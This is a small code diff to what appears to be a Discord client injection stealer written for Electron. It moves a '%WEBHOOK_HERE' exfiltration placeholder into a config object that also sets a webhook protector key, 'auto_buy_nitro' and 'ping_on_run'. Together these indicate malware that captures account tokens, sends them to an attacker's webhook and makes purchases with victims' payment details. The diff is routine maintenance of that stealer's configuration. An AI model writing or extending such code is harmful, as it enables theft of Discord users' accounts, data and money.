@@ -7,10 +7,9 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 const Buffer = require('buffer').Buffer
-const hook = '%WEBHOOK_HERE'
 
 const config = {
-  webhook: hook,
+  webhook: '%WEBHOOK_HERE',
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: true, 
   ping_on_run: true, 
